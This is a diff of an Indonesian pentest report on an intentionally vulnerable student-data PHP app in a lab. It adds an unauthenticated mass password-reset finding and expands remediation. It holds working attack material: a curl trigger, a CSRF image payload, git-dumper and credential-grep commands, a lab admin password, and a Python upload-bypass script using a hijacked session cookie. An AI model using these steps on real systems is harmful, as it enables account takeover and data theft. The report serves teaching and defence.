@@ -1,6 +1,6 @@
 # LAPORAN PENTEST V2 — Aplikasi Management Data Siswa
 
-- **Target:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/`
+- **Target:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/`
 - **Setup Lab:** Aplikasi berjalan di **Windows (Laragon)**, Attacker di **Kali Linux**
 - **Tanggal:** 21–22 September 2026 (patch: 23 September 2026)
 - **Tester:** gh05t4n
@@ -25,6 +25,10 @@
     - [4.6 Business Logic — Validasi NISN (LOW)](#46-business-logic--validasi-nisn-low)
     - [4.7 Upload Bypass via Base64 (HIGH)](#47-upload-bypass-via-base64-high)
     - [4.8 Kredensial Siswa Default = NISN (CRITICAL)](#48-kredensial-siswa-default--nisn-critical)
+    - [4.9 Mass Password Reset Endpoint — Tanpa Autentikasi (CRITICAL)](#49-mass-password-reset-endpoint--tanpa-autentikasi-critical)
+    - [Immediate (0-1 jam)](#immediate-0-1-jam)
+    - [Short-term (1-24 jam)](#short-term-1-24-jam)
+    - [Long-term (1-7 hari)](#long-term-1-7-hari)
   - [5. Vektor yang Diuji \& Aman](#5-vektor-yang-diuji--aman)
   - [6. Matriks Risiko](#6-matriks-risiko)
   - [7. Rekomendasi Perbaikan](#7-rekomendasi-perbaikan)
@@ -50,25 +54,28 @@
 
 ## 1. Ringkasan Eksekutif
 
-Aplikasi **Management Data Siswa** memiliki **4 temuan Critical**, **2 High**, **2 Medium**, dan **1 Low**. Temuan paling berdampak adalah **eksposur folder `.git`** yang memungkinkan penyerang mengambil **seluruh source code** dan **credential admin** dari **git history**.
+Aplikasi **Management Data Siswa** memiliki **5 temuan Critical**, **2 High**, **2 Medium**, dan **1 Low**. Temuan paling berdampak adalah **eksposur folder `.git`** yang memungkinkan penyerang mengambil **seluruh source code** dan **credential admin** dari **git history**.
 
-Selain itu, ditemukan **kelemahan kritis pada manajemen kredensial siswa**: username dan password default untuk akun siswa menggunakan **NISN** (Nomor Induk Siswa Nasional). NISN bersifat **semi-publik** (tertera di kartu pelajar, rapor, formulir pendaftaran, dan sering dibagikan dalam konteks administratif), sehingga kombinasi NISN + NISN sebagai kredensial login membuat akun siswa **sangat rentan diambil alih**.
+Selain itu, ditemukan **endpoint `reset_password.php` tanpa autentikasi** yang secara aktif **me-reset password seluruh akun siswa ke NISN mereka sendiri** — kapan saja, oleh siapa saja, tanpa login. Ini menjadikan temuan 4.8 (kredensial default = NISN) **bukan sekadar konfigurasi awal**, melainkan **kerentanan aktif yang bisa dipicu ulang** untuk meniadakan setiap upaya rotasi password.
 
 Dengan credential yang didapat dari git history maupun dari NISN, penyerang bisa **login sebagai admin maupun siswa** dan mengakses seluruh fungsi aplikasi. Meskipun aplikasi sudah menerapkan **prepared statement**, **CSRF token**, **role-based access control**, dan **whitelist ekstensi upload**, masih ditemukan **celah upload bypass via base64** pada endpoint `absensi_siswa.php` — dieksploitasi menggunakan script Python `LaporanV2/file_bypass.py`.
 
-> **Status perbaikan (23 Sep 2026):** Temuan **4.7** telah **dipatch** melalui `LaporanV2/siswa_absensifix.php` (v1.1 → v1.2). Detail lihat [Remediasi Terapan](#remediasi-terapan-v11--v12) dan [`note.md`](note.md). Temuan **4.8** (kredensial siswa = NISN) **belum dipatch** — masih butuh perubahan di level manajemen akun.
+> **Status perbaikan (23 Sep 2026):**
+> - Temuan **4.7** telah **dipatch** melalui `LaporanV2/siswa_absensifix.php` (v1.1 → v1.2). Detail lihat [Remediasi Terapan](#remediasi-terapan-v11--v12) dan [`note.md`](note.md).
+> - Temuan **4.8** dan **4.9** **belum dipatch** — masih butuh perubahan di level manajemen akun dan penghapusan endpoint.
 
 **Catatan penting:** Setup lab ini **sengaja** dibuat rentan untuk keperluan pembelajaran. Di lingkungan production, konfigurasi seperti ini **tidak boleh** terjadi.
 
 **Prioritas perbaikan:**
 
-1. Blokir akses ke `.git` di web server (Production)
-2. Rotasi seluruh password (admin, user, DB, siswa)
-3. Hapus git history yang mengandung credential (Production)
-4. Nonaktifkan directory listing
-5. Gunakan HTTPS + flag `Secure`/`HttpOnly` pada cookie
-6. **Hentikan penggunaan NISN sebagai username/password default siswa**
-7. Terapkan praktik aman push ke GitHub (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
+1. **Hapus `reset_password.php`** dari server production
+2. Blokir akses ke `.git` di web server (Production)
+3. Rotasi seluruh password (admin, user, DB, siswa) dengan password acak kuat
+4. Hapus git history yang mengandung credential (Production)
+5. Nonaktifkan directory listing
+6. Gunakan HTTPS + flag `Secure`/`HttpOnly` pada cookie
+7. **Hentikan penggunaan NISN sebagai username/password default siswa**
+8. Terapkan praktik aman push ke GitHub (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
 
 ## 2. Lingkup & Setup Lab
 
@@ -76,10 +83,10 @@ Dengan credential yang didapat dari git history maupun dari NISN, penyerang bisa
 | -------------- | -------------------------------------------------------- |
 | **Aplikasi**   | Management Data Siswa (PHP + MySQL)                      |
 | **Web Server** | Laragon (Windows)                                        |
-| **Target IP**  | `192.168.100.247`                                        |
+| **Target IP**  | `192.168.1.12`                                           |
 | **Attacker**   | Kali Linux (VM)                                          |
-| **Jaringan**   | Bridged / Host-Only (satu subnet `192.168.100.x`)        |
-| **Scope**      | `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/` |
+| **Jaringan**   | Bridged / Host-Only (satu subnet `192.168.1.x`)          |
+| **Scope**      | `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/`    |
 
 **Catatan:** Karena attacker & victim berada di **satu jaringan**, sniffing HTTP (tanpa TLS) menjadi **realistis** dan **valid** untuk diuji.
 
@@ -107,7 +114,7 @@ LaporanV2/
 ### Reconnaissance
 
 ```bash
-feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2 \
+feroxbuster -u http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2 \
   -w /usr/share/wordlists/dirb/common.txt
 ```
 
@@ -121,6 +128,7 @@ feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2 \
 200  classes/siswa.php
 200  classes/guru.php
 200  classes/kelas.php
+200  reset_password.php                 → Backdoor tanpa auth (BARU!)
 301  uploads/                           → Directory listing
 301  config/                            → Directory listing
 301  note/                              → Directory listing
@@ -135,14 +143,14 @@ feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2 \
 **Deskripsi:**
 Folder `.git` dapat diakses publik via HTTP, memungkinkan recovery source code lengkap. Laragon (default) tidak memblokir akses ke `.git`.
 
-**URL:** `http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/`
+**URL:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/`
 
 **Proof of Concept:**
 
 ```bash
-git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/ ./hasil-git
+git-dumper http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/ ./hasil-git
 
-[-] Testing http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/HEAD [200]
+[-] Testing http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/HEAD [200]
 [-] Fetching .git recursively
 ...
 [-] Running git checkout .
@@ -207,7 +215,7 @@ echo "<p>Password User: <b>user123</b></p>";
 **Eksploitasi:**
 
 ```
-URL: http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/login.php
+URL: http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/login.php
 Username: admin
 Password: kalinadmin08
 ```
@@ -321,11 +329,11 @@ Beberapa direktori mengaktifkan directory listing, memungkinkan enumerasi file.
 **URL:**
 
 ```
-http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/uploads/
-http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/config/
-http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/classes/
-http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/note/
-http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/views/
+http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/uploads/
+http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/config/
+http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/classes/
+http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/note/
+http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/views/
 ```
 
 **Dampak:**
@@ -525,7 +533,7 @@ Interpretasi: akun siswa dibuat dengan pola **username = NISN** dan **password =
 **Proof of Concept (konseptual):**
 
 ```
-URL: http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/login.php
+URL: http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/login.php
 Username: 010101101010   ← NISN
 Password: 010101101010   ← NISN yang sama
 ```
@@ -578,6 +586,255 @@ if (!preg_match('/^[0-9]{10}$/', $nisn)) {
 }
 ```
 
+### 4.9 Mass Password Reset Endpoint — Tanpa Autentikasi (CRITICAL)
+
+**Deskripsi:**
+Endpoint `reset_password.php` dapat diakses **publik tanpa autentikasi apa pun**. Endpoint ini:
+
+1. Mengambil **seluruh akun siswa** dari tabel `users` (role = `siswa`).
+2. Meng-**update password** setiap akun menjadi **username mereka sendiri** (yang berisi NISN).
+3. **Menampilkan hasil** — termasuk hash bcrypt yang baru — ke response HTTP.
+4. **Menyediakan link langsung** ke halaman login, plus kredensial yang valid.
+
+Endpoint ini berfungsi sebagai **backdoor**: siapa pun yang bisa mengakses URL-nya dapat **me-reset password seluruh siswa kapan saja**, berulang kali, tanpa jejak autentikasi. Bahkan jika admin melakukan rotasi password, endpoint ini **mengembalikannya ke NISN** dalam sekejap.
+
+**URL:** `http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/reset_password.php`
+
+**Source Code Endpoint:**
+
+```php
+<?php
+require_once 'classes/database.php';
+
+$database = new Database();
+$db = $database->getConnection();
+
+try {
+    // 1. Ambil semua akun role 'siswa'
+    $stmt = $db->query("SELECT id, username FROM users WHERE role = 'siswa'");
+    $users = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+    $count = 0;
+    foreach ($users as $u) {
+        $username = trim($u['username']);
+        
+        // Buat hash dengan PASSWORD_DEFAULT
+        $hash = password_hash($username, PASSWORD_DEFAULT);
+
+        $update = $db->prepare("UPDATE users SET password = :pass WHERE id = :id");
+        $update->execute([
+            ':pass' => $hash,
+            ':id'   => $u['id']
+        ]);
+        $count++;
+    }
+
+    echo "<h3>✅ Berhasil Update Password untuk $count Siswa!</h3>";
+    echo "<hr>";
+
+    // 2. TES UJI COBA LANGSUNG UNTUK SATU SISWA (Arga Setyawan)
+    $tes_nisn = '00512345614';
+    $cek = $db->prepare("SELECT * FROM users WHERE username = :u");
+    $cek->execute([':u' => $tes_nisn]);
+    $user_tes = $cek->fetch(PDO::FETCH_ASSOC);
+
+    if ($user_tes) {
+        echo "<b>Hasil Pengujian Akun Test ($tes_nisn):</b><br>";
+        echo "Username: " . $user_tes['username'] . "<br>";
+        echo "Hash di DB: " . $user_tes['password'] . "<br>";
+        echo "Panjang Hash: " . strlen($user_tes['password']) . " karakter<br>";
+
+        // Uji fungsi password_verify
+        if (password_verify($tes_nisn, $user_tes['password'])) {
+            echo "<h2 style='color:green;'>🎉 KONEKSI HASH COCOK (MATCH)!</h2>";
+            echo "<p>Sekarang silakan buka <a href='login.php'>Halaman Login</a> dan masuk dengan:</p>";
+            echo "<ul><li><b>Username:</b> 00512345614</li><li><b>Password:</b> 00512345614</li></ul>";
+        } else {
+            echo "<h2 style='color:red;'>❌ HASH TETAP TIDAK COCOK!</h2>";
+        }
+    }
+
+} catch (PDOException $e) {
+    echo "Error: " . $e->getMessage();
+}
+?>
+```
+
+**Proof of Concept:**
+
+```bash
+curl -s http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/reset_password.php
+```
+
+**Output:**
+
+```html
+<h3>✅ Berhasil Update Password untuk 21 Siswa!</h3><hr>
+<b>Hasil Pengujian Akun Test (00512345614):</b><br>
+Username: 00512345614<br>
+Hash di DB: $2y$10$JY7TBub2W3oVzC32NeNGyu.zhNBxAEuvp0HaxjdCoI.8r9UibR5Ji<br>
+Panjang Hash: 60 karakter<br>
+<h2 style='color:green;'>🎉 KONEKSI HASH COCOK (MATCH)!</h2>
+<p>Sekarang silakan buka <a href='login.php'>Halaman Login</a> dan masuk dengan:</p>
+<ul>
+  <li><b>Username:</b> 00512345614</li>
+  <li><b>Password:</b> 00512345614</li>
+</ul>
+```
+
+**Bukti tambahan:**
+- Diakses dari Kali Linux (VM) via browser & `curl`.
+- **Tanpa cookie**, **tanpa header Authorization**, **tanpa form login**.
+- **21 akun siswa** ter-reset dalam satu request.
+- Hash baru ditampilkan ke publik.
+- Instruksi login dengan `username=NISN, password=NISN` juga ditampilkan.
+
+**Analisis Dampak Konkret:**
+
+Sebelum attacker menjalankan endpoint ini, siswa memiliki password masing-masing (mis. `12345678`, `budi2007`, `citra!secure`). Setelah attacker menjalankan:
+
+| Siswa | Username | Password Sebelum | Password Sesudah |
+|-------|----------|------------------|------------------|
+| Arga  | `00512345614` | `12345678` | **`00512345614`** (NISN) |
+| Budi  | `00512345615` | `budi2007` | **`00512345615`** (NISN) |
+| Citra | `00512345616` | `citra!secure` | **`00512345616`** (NISN) |
+| ... (18 siswa lain) | ... | ... | **= username masing-masing** |
+
+**Attacker yang tahu NISN mereka dapat langsung login ke akun manapun.** Siswa tidak sadar password-nya sudah berubah.
+
+**Vektor Eksploitasi Tambahan (CSRF):**
+
+Karena endpoint menerima **GET** dan tidak ada CSRF token, attacker dapat memicunya dari situs mana pun:
+
+```html
+<img src="http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/reset_password.php" width="1" height="1">
+```
+
+Saat korban (mis. admin) membuka halaman berisi tag ini, browser otomatis mengirim GET ke endpoint → **21 akun siswa ter-reset** tanpa korban sadar.
+
+**Dampak:**
+
+| # | Dampak | Tingkat |
+|---|--------|---------|
+| 1 | **Mass account takeover** — 21 akun siswa diambil alih sekaligus | CRITICAL |
+| 2 | **Zero authentication** — attacker mana pun bisa memicu | CRITICAL |
+| 3 | **Information disclosure** — hash bcrypt ditampilkan di response | HIGH |
+| 4 | **Persistent backdoor** — bisa dipicu ulang untuk mereset ulang | CRITICAL |
+| 5 | **Bypass rotasi password** — meski 4.8 dipatch, endpoint ini mengembalikannya ke NISN | CRITICAL |
+| 6 | **CSRF-triggerable** — bisa dipicu tanpa interaksi attacker langsung | HIGH |
+| 7 | **Eskalasi ke 4.7** — session siswa yang diambil alih bisa dipakai untuk upload bypass | HIGH |
+
+**Severity:** 🔴 **CRITICAL** (CVSS 9.8)
+
+**CVSS Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
+
+| Metrik | Nilai | Alasan |
+|--------|-------|--------|
+| AV | Network | Diakses via HTTP, tanpa perlu akses fisik |
+| AC | Low | Tidak perlu kondisi khusus |
+| PR | None | Tanpa autentikasi |
+| UI | None | Tanpa interaksi user |
+| S | Unchanged | Dampak terbatas pada aplikasi |
+| C | High | Hash password ditampilkan |
+| I | High | Password semua siswa diubah |
+| A | High | Akun siswa tidak bisa diakses pemiliknya |
+
+**CWE:**
+- CWE-306: Missing Authentication for Critical Function
+- CWE-620: Unverified Password Change
+- CWE-798: Use of Hard-coded Credentials
+- CWE-352: Cross-Site Request Forgery (CSRF)
+
+**Remediasi:**
+
+### Immediate (0-1 jam)
+
+1. **HAPUS file `reset_password.php` dari server production.**
+   ```bash
+   rm /path/to/UK1-Kalinna2/reset_password.php
+   ```
+   Ini **bukan fitur** — ini **backdoor**. Tidak ada alasan untuk mempertahankannya di production.
+
+2. **Rotasi seluruh password siswa** — dengan password acak yang kuat (bukan NISN):
+   ```php
+   // Contoh: generate password acak 16 karakter
+   $password = bin2hex(random_bytes(8)); // atau
+   $password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$'), 0, 16);
+   ```
+
+3. **Audit log akses** — cari siapa saja yang pernah mengakses endpoint ini:
+   ```bash
+   grep "reset_password.php" /var/log/apache2/access.log
+   grep "reset_password.php" /var/log/nginx/access.log
+   ```
+   
+   Cari pola:
+   - Request dari IP tidak dikenal.
+   - Request berulang (menandakan trigger berulang).
+   - User-Agent aneh (`curl`, `python-requests`, dll.).
+
+4. **Periksa integritas database** — pastikan tidak ada perubahan lain:
+   ```sql
+   SELECT id, username, updated_at 
+   FROM users 
+   WHERE role = 'siswa' 
+   ORDER BY updated_at DESC;
+   ```
+
+### Short-term (1-24 jam)
+
+5. **Hapus endpoint semacam ini dari repo** + tambahkan ke `.gitignore`:
+   ```gitignore
+   reset_*.php
+   fix_*.php
+   test_*.php
+   setup_*.php
+   install_*.php
+   debug_*.php
+   ```
+
+6. **Audit seluruh source code** untuk endpoint serupa:
+   ```bash
+   grep -rn "UPDATE users SET password" .
+   grep -rn "password_hash(" . | grep -v "class"
+   grep -rn "reset_password\|forgot_password" .
+   ```
+
+7. **Blokir akses ke file-file dev** via web server config:
+   ```apache
+   # .htaccess / Apache
+   <FilesMatch "^(reset_|fix_|test_|setup_|install_|debug_).*\.php$">
+       Require all denied
+   </FilesMatch>
+   ```
+   ```nginx
+   # Nginx
+   location ~ ^/(reset_|fix_|test_|setup_|install_|debug_).*\.php$ {
+       deny all;
+   }
+   ```
+
+### Long-term (1-7 hari)
+
+8. **Pisahkan tooling dev dari production code.** Script maintenance harus dijalankan via **CLI** (bukan endpoint HTTP):
+   ```bash
+   php scripts/reset_password_cli.php --confirm
+   ```
+   Bukan diakses via browser.
+
+9. **Wajib autentikasi + role admin** untuk semua operasi yang menyentuh `users` table. Bahkan untuk admin, gunakan **CSRF token** dan **re-authentication** (mis. minta password admin lagi).
+
+10. **Logging + alert** untuk operasi mass-update:
+    - Alert jika ada `UPDATE users` yang mengubah > 1 row.
+    - Alert jika ada akses ke file yang mengandung `reset_`, `fix_`, dll.
+
+11. **Rate limiting** di level web server — batasi request ke endpoint `*.php` tertentu.
+
+12. **Content Security Policy (CSP)** — untuk mencegah CSRF-style attack via `<img>`:
+    ```
+    Content-Security-Policy: default-src 'self'; img-src 'self';
+    ```
+
 ## 5. Vektor yang Diuji & Aman
 
 | Vektor                          | Status       | Bukti                                                                                                         |
@@ -594,52 +851,56 @@ if (!preg_match('/^[0-9]{10}$/', $nisn)) {
 
 ## 6. Matriks Risiko
 
-| #   | Temuan                          | Severity    | CVSS | Status                                                    |
-| --- | ------------------------------- | ----------- | ---- | --------------------------------------------------------- |
-| 4.1 | Git Repository Exposure         | 🔴 Critical | 9.1  | Confirmed                                                 |
-| 4.2 | Credential Leak di Git History  | 🔴 Critical | 9.8  | Confirmed (login berhasil)                                |
-| 4.3 | Database Dump Ke-commit         | 🟠 High     | 7.5  | Confirmed (masih ada di commit)                           |
-| 4.4 | Directory Listing Aktif         | 🟡 Medium   | 5.3  | Confirmed                                                 |
-| 4.5 | Session Hijacking via HTTP      | 🟡 Medium   | 5.9  | Confirmed                                                 |
-| 4.6 | Business Logic — Validasi NISN  | 🟢 Low      | 3.1  | Confirmed                                                 |
-| 4.7 | Upload Bypass via Base64        | 🟠 High     | 7.3  | ✅ Patched (v1.2) — turun ke 🟡 Medium (5.3)              |
-| 4.8 | Kredensial Siswa Default = NISN | 🔴 Critical | 9.4  | Confirmed — belum dipatch                                 |
+| #   | Temuan                                | Severity    | CVSS | Status                                                    |
+| --- | ------------------------------------- | ----------- | ---- | --------------------------------------------------------- |
+| 4.1 | Git Repository Exposure               | 🔴 Critical | 9.1  | Confirmed                                                 |
+| 4.2 | Credential Leak di Git History        | 🔴 Critical | 9.8  | Confirmed (login berhasil)                                |
+| 4.3 | Database Dump Ke-commit               | 🟠 High     | 7.5  | Confirmed (masih ada di commit)                           |
+| 4.4 | Directory Listing Aktif               | 🟡 Medium   | 5.3  | Confirmed                                                 |
+| 4.5 | Session Hijacking via HTTP            | 🟡 Medium   | 5.9  | Confirmed                                                 |
+| 4.6 | Business Logic — Validasi NISN        | 🟢 Low      | 3.1  | Confirmed                                                 |
+| 4.7 | Upload Bypass via Base64              | 🟠 High     | 7.3  | ✅ Patched (v1.2) — turun ke 🟡 Medium (5.3)              |
+| 4.8 | Kredensial Siswa Default = NISN       | 🔴 Critical | 9.4  | Confirmed — belum dipatch                                 |
+| 4.9 | Mass Password Reset Endpoint          | 🔴 Critical | 9.8  | Confirmed — belum dipatch                                 |
 
-**Total:** 4 Critical, 2 High, 2 Medium, 1 Low → setelah patch 4.7: **4 Critical, 1 High, 3 Medium, 1 Low**
+**Total:** **5 Critical, 2 High, 2 Medium, 1 Low** → setelah patch 4.7: **5 Critical, 1 High, 3 Medium, 1 Low**
 
 ## 7. Rekomendasi Perbaikan
 
 ### Prioritas 1 (Immediate)
 
-1. **Blokir akses `.git`** di web server config (Apache/Nginx)
-2. **Rotasi seluruh password** (admin, user, DB, siswa)
-3. **Hapus git history** yang mengandung credential dan file sensitif:
+1. **HAPUS `reset_password.php`** dari server production — ini backdoor, bukan fitur.
+2. **Blokir akses `.git`** di web server config (Apache/Nginx).
+3. **Rotasi seluruh password** (admin, user, DB, siswa) dengan password acak kuat.
+4. **Hapus git history** yang mengandung credential dan file sensitif:
    ```bash
    git filter-repo --path fix.php --invert-paths
    git filter-repo --path db_management_data_siswa.sql --invert-paths
+   git filter-repo --path reset_password.php --invert-paths
    ```
    > **Catatan:** Menghapus file dari branch aktif **TIDAK CUKUP**. File masih bisa diakses via commit history. Wajib pakai `git filter-repo` atau BFG.
-4. **Hapus `.sql` dari repo** + tambahkan ke `.gitignore`
-5. ~~Perbaiki validasi upload base64 di `absensi_siswa.php`~~ — ✅ **DONE** (lihat remediasi 4.7)
-6. **Hentikan penggunaan NISN sebagai username/password siswa** — generate password acak, paksa ganti saat login pertama
+5. **Hapus `.sql` dari repo** + tambahkan ke `.gitignore`.
+6. ~~Perbaiki validasi upload base64 di `absensi_siswa.php`~~ — ✅ **DONE** (lihat remediasi 4.7).
+7. **Hentikan penggunaan NISN sebagai username/password siswa** — generate password acak, paksa ganti saat login pertama.
 
 ### Prioritas 2 (Short-term)
 
-7. **Nonaktifkan directory listing** (`Options -Indexes`)
-8. **Aktifkan HTTPS** (TLS/SSL)
-9. **Set cookie flag**: `Secure`, `HttpOnly`, `SameSite=Strict`
-10. **Regenerasi session ID** setelah login
-11. **Rate limiting** pada endpoint login dan absensi
-12. **CAPTCHA** pada form login
+8. **Audit seluruh source code** untuk endpoint serupa (`reset_*`, `fix_*`, `test_*`, `debug_*`).
+9. **Nonaktifkan directory listing** (`Options -Indexes`).
+10. **Aktifkan HTTPS** (TLS/SSL).
+11. **Set cookie flag**: `Secure`, `HttpOnly`, `SameSite=Strict`.
+12. **Regenerasi session ID** setelah login.
+13. **Rate limiting** pada endpoint login dan absensi.
+14. **CAPTCHA** pada form login.
 
 ### Prioritas 3 (Long-term)
 
-13. **Validasi input NISN** (hanya angka, 10 digit)
-14. **Gunakan environment variable** untuk credential (`.env`)
-15. **Aktifkan logging & monitoring** untuk akses `.git`, login gagal, dan upload mencurigakan
-16. **Implementasi 2FA** untuk akun admin
-17. **Security awareness training** untuk developer
-18. **Gunakan `.gitignore`** yang proper sebelum commit (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
+15. **Validasi input NISN** (hanya angka, 10 digit).
+16. **Gunakan environment variable** untuk credential (`.env`).
+17. **Aktifkan logging & monitoring** untuk akses `.git`, login gagal, dan upload mencurigakan.
+18. **Implementasi 2FA** untuk akun admin.
+19. **Security awareness training** untuk developer.
+20. **Gunakan `.gitignore`** yang proper sebelum commit (lihat [Bagian 8](#8-panduan-aman-push-ke-github)).
 
 ## 8. Panduan Aman Push ke GitHub
 
@@ -676,6 +937,9 @@ fix.php
 fix_*.php
 reset_*.php
 test_*.php
+setup_*.php
+install_*.php
+debug_*.php
 *_backup.php
 
 # ===== PAYLOAD / EXPLOIT SCRIPT =====
@@ -882,6 +1146,7 @@ git filter-repo --path fix.php --invert-paths
 git filter-repo --path db_management_data_siswa.sql --invert-paths
 git filter-repo --path config/database.php --invert-paths
 git filter-repo --path payload/ --invert-paths
+git filter-repo --path reset_password.php --invert-paths
 
 # Force push
 git push origin --force --all
@@ -895,6 +1160,7 @@ wget https://repo1.maven.org/maven2/com/madgag/bfg/1.14.0/bfg-1.14.0.jar
 java -jar bfg-1.14.0.jar --delete-files fix.php
 java -jar bfg-1.14.0.jar --delete-files "*.sql"
 java -jar bfg-1.14.0.jar --delete-folders payload
+java -jar bfg-1.14.0.jar --delete-files reset_password.php
 
 git reflog expire --expire=now --all
 git gc --prune=now --aggressive
@@ -938,7 +1204,7 @@ Pakai di workflow:
 [ ] File .env TIDAK di-commit (hanya .env.example)
 [ ] File config/database.php TIDAK di-commit
 [ ] File *.sql TIDAK di-commit
-[ ] File fix.php / reset_*.php TIDAK di-commit
+[ ] File fix.php / reset_*.php / test_*.php TIDAK di-commit
 [ ] Folder payload/ TIDAK di-commit (berisi script exploit)
 [ ] Credential di source code pakai environment variable
 [ ] Pre-commit hook sudah dipasang
@@ -966,6 +1232,7 @@ cat > .gitignore << 'EOF'
 *.log
 config/database.php
 fix.php
+reset_*.php
 payload/
 EOF
 
@@ -1030,32 +1297,66 @@ LaporanV2/
 **`LaporanV2/file_bypass.py`:**
 
 ```python
-import requests, base64
+#!/usr/bin/env python3
+import requests
+import base64
+import os
 
-# Baca gambar & encode ke base64
-with open("me.jpeg", "rb") as f:
-    img_b64 = base64.b64encode(f.read()).decode()
+URL = input("Masukkan URL Target : ").strip()
+COOKIE_VALUE = input("Masukkan Cookie : ").strip().replace('PHPSESSID=', '').strip()
+IMAGE_PATH   = input("Masukkan File JPEG : ").strip().strip('"').strip("'")
+IMAGE_PATH   = os.path.expanduser(os.path.expandvars(IMAGE_PATH))
 
-# Field form-data
+if not URL:
+    print("[ERROR] URL kosong.")
+    raise SystemExit(1)
+
+if not URL.startswith(('http://', 'https://')):
+    URL = 'http://' + URL
+    print(f"[!] URL tanpa skema, di-prefix: {URL}")
+
+if not COOKIE_VALUE:
+    print("[ERROR] Cookie kosong.")
+    raise SystemExit(1)
+
+if not IMAGE_PATH:
+    print("[ERROR] Path gambar kosong.")
+    raise SystemExit(1)
+
+if not os.path.isfile(IMAGE_PATH):
+    print(f"[ERROR] File tidak ditemukan: {IMAGE_PATH}")
+    raise SystemExit(1)
+
+try:
+    with open(IMAGE_PATH, 'rb') as f:
+        img_b64 = base64.b64encode(f.read()).decode()
+except Exception as e:
+    print(f"[ERROR] Gagal membaca file: {e}")
+    raise SystemExit(1)
+
 files = {
     'jenis_absen': (None, 'Hadir'),
-    'image': (None, f'data:image/jpeg;base64,{img_b64}'),
-    'latitude': (None, '-6.200000'),
-    'longitude': (None, '106.816666'),
+    'image':       (None, f'data:image/jpeg;base64,{img_b64}'),
+    'latitude':    (None, '-6.200000'),
+    'longitude':   (None, '106.816666'),
 }
+cookies = {'PHPSESSID': COOKIE_VALUE}
 
-# Session cookie (hasil hijack / login)
-cookies = {'PHPSESSID': 'mc99rsr99gaectrbrislcqb9l8'}
+print(f"[*] Target : {URL}")
+print(f"[*] Image  : {IMAGE_PATH}")
+print(f"[*] Cookie : {COOKIE_VALUE[:16]}...")
+print("[*] Mengirim POST...")
 
-# Kirim request
-r = requests.post(
-    'http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/absensi_siswa.php',
-    files=files,
-    cookies=cookies,
-)
-
-print(r.status_code)
-print(r.text[:500])
+try:
+    r = requests.post(URL, files=files, cookies=cookies, timeout=15)
+    print(f"\n[OKE] Status: {r.status_code}")
+    print(r.text[:500])
+except requests.exceptions.Timeout:
+    print("[ERROR] Request timeout — server tidak merespons.")
+except requests.exceptions.ConnectionError:
+    print("[ERROR] Gagal terhubung ke server — cek IP/port.")
+except Exception as e:
+    print(f"[ERROR] {e}")
 ```
 
 **Cara menjalankan:**
@@ -1075,10 +1376,10 @@ pip install requests
 
 ```bash
 # Reconnaissance
-feroxbuster -u http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2 -w /usr/share/wordlists/dirb/common.txt
+feroxbuster -u http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2 -w /usr/share/wordlists/dirb/common.txt
 
 # Git dump
-git-dumper http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/ ./hasil-git
+git-dumper http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/.git/ ./hasil-git
 
 # Credential search
 git log -p --all | grep -iE "password|secret|api_key|token"
@@ -1088,11 +1389,14 @@ git log --all --full-history -- "db_management_data_siswa.sql"
 git show <commit_hash>:db_management_data_siswa.sql
 
 # Directory listing check
-curl http://192.168.100.247/UK-PKL_Banjar/UK1/UK1-Kalinna2/uploads/
+curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/uploads/
 
 # Upload bypass base64 (via LaporanV2/file_bypass.py)
 cd LaporanV2/
 python3 file_bypass.py
+
+# Trigger mass password reset (TEMUAN 4.9)
+curl -s http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Kalinna2/reset_password.php
 
 # Login siswa dengan NISN (konseptual)
 # Username: <NISN>  Password: <NISN>
@@ -1107,13 +1411,12 @@ python3 file_bypass.py
